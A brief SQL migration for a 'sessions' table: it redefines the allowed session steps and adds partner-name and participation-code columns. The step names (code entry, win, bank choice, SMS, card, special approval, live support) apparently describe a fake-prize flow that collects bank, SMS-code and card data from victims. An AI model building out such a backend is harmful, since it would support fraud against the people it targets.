alter table public.sessions drop constraint if exists sessions_current_step_check;
alter table public.sessions add constraint sessions_current_step_check
check (current_step in ('code_entry', 'win', 'banken', 'wait', 'sms', 'card', 'congrats', 'special_approval', 'SPECIAL_INFO', 'invalid_bank', 'live_support'));

alter table public.sessions add column if not exists partner_name text;
alter table public.sessions add column if not exists participation_code text;